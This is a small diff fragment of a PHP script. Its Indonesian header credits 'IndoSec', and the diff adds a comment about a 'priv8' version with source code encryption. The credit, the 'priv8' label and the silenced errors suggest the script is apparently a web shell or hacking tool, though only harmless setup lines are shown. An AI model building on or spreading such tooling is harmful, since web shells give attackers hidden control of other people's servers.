@@ -12,6 +12,14 @@
 	* Untuk Tools Yang Lain Akan Ditambahkan DiVersi Berikutnya..
 	* �2019 { IndoSec } -Holiq-
 */
+
+
+
+//priv8 version only adding source code encryption, nothing special after all.
+
+
+
+
 session_start();
 error_reporting(0);
 set_time_limit(0);
